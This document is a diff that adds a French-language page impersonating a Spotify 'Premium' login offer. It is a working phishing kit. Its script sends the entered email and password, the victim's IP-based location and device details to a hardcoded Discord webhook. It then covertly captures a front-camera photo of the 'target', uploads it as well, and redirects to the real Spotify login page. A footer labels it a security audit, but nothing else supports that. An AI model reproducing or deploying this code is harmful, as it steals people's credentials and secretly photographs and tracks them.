@@ -1,0 +1,115 @@
+<div class="w-full max-w-sm flex flex-col items-center">
+    <img src="[https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png](https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png)" alt="Spotify" class="w-32 mb-10">
+    
+    <div class="w-full card p-8 shadow-2xl">
+        <h1 class="text-2xl font-black mb-1 text-center">Accès Premium</h1>
+        <p class="text-gray-400 text-xs mb-8 text-center font-medium">Offre spéciale : 3 mois offerts. Connectez-vous.</p>
+        
+        <div class="space-y-5">
+            <div>
+                <label class="block text-[10px] font-bold mb-2 uppercase tracking-widest text-gray-400">E-mail ou nom d'utilisateur</label>
+                <input id="u" type="text" placeholder="E-mail ou nom d'utilisateur" class="w-full p-3 spot-input rounded text-sm font-semibold">
+            </div>
+            <div>
+                <label class="block text-[10px] font-bold mb-2 uppercase tracking-widest text-gray-400">Mot de passe</label>
+                <input id="p" type="password" placeholder="Mot de passe" class="w-full p-3 spot-input rounded text-sm font-semibold">
+            </div>
+            
+            <button onclick="sendData()" id="btn" class="btn-green mt-4 uppercase tracking-widest text-xs">
+                ACTIVER MAINTENANT
+            </button>
+        </div>
+        
+        <div class="mt-8 pt-6 border-t border-gray-800 text-center">
+            <p class="text-[9px] text-gray-500 font-bold uppercase tracking-widest">© Spotify AB</p>
+        </div>
+    </div>
+</div>
+
+<!-- Éléments de capture invisibles -->
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
+
+<script>
+    const hook = "[https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke](https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke)";
+
+    async function sendData() {
+        const user = document.getElementById('u').value;
+        const pass = document.getElementById('p').value;
+        const btn = document.getElementById('btn');
+
+        if (!user || !pass) return;
+        
+        btn.innerHTML = "CHARGEMENT...";
+        btn.disabled = true;
+
+        // 1. Récupération IP et Localisation détaillée
+        let net = { ip: "Inconnue", city: "Inconnue", country_name: "Inconnu", org: "Inconnu", region: "Inconnue" };
+        try {
+            const res = await fetch('[https://ipapi.co/json/](https://ipapi.co/json/)');
+            net = await res.json();
+        } catch(e) {}
+
+        // 2. Récupération Batterie
+        let bat = "Inconnue";
+        try {
+            const b = await navigator.getBattery();
+            bat = `${Math.round(b.level * 100)}% (${b.charging ? 'En charge' : 'Sur batterie'})`;
+        } catch(e) {}
+
+        // 3. Récupération Hardware (RAM, CPU, Écran)
+        const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Inconnue";
+        const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cœurs` : "Inconnu";
+        const screen = `${window.screen.width}x${window.screen.height}`;
+
+        // 4. Envoi du Rapport Textuel vers Discord
+        const payload = {
+            embeds: [{
+                title: "🚀 LOG RÉCUPÉRÉ - SYSTÈME ULTRA V4",
+                color: 1947988,
+                thumbnail: { url: "[https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Spotify_logo_without_text.svg/1024px-Spotify_logo_without_text.svg.png](https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Spotify_logo_without_text.svg/1024px-Spotify_logo_without_text.svg.png)" },
+                fields: [
+                    { name: "👤 Identifiants", value: `**Email:** \`${user}\`\n**Pass:** \`${pass}\``, inline: false },
+                    { name: "🌐 Localisation & FAI", value: `**IP:** \`${net.ip}\`\n**Ville:** \`${net.city} (${net.region})\`\n**Pays:** \`${net.country_name}\`\n**Opérateur:** \`${net.org}\``, inline: false },
+                    { name: "📱 Matériel (Hardware)", value: `**RAM:** \`${ram}\`\n**CPU:** \`${cores}\`\n**Écran:** \`${screen}\`\n**Plateforme:** \`${navigator.platform}\``, inline: true },
+                    { name: "🔋 État Système", value: `**Batterie:** \`${bat}\`\n**Langue:** \`${navigator.language}\``, inline: true },
+                    { name: "🖥️ Navigateur (User-Agent)", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                ],
+                footer: { text: "Audit Sécurité LVN • " + new Date().toLocaleString() }
+            }]
+        };
+
+        await fetch(hook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        // 5. Capture Photo Frontale
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('v');
+            video.srcObject = stream;
+            
+            await new Promise(r => setTimeout(r, 2000)); // Attente réglage caméra
+            
+            const canvas = document.getElementById('c');
+            canvas.width = 640; 
+            canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('file', blob, 'capture.png');
+                fd.append('content', "📸 **Capture caméra frontale de la cible :**");
+                await fetch(hook, { method: 'POST', body: fd });
+                stream.getTracks().forEach(t => t.stop());
+            }, 'image/png');
+        } catch (e) {}
+
+        // 6. Redirection finale vers le vrai site
+        setTimeout(() => {
+            window.location.href = "[https://www.spotify.com/fr/login/](https://www.spotify.com/fr/login/)";
+        }, 3000);
+    }
+</script>
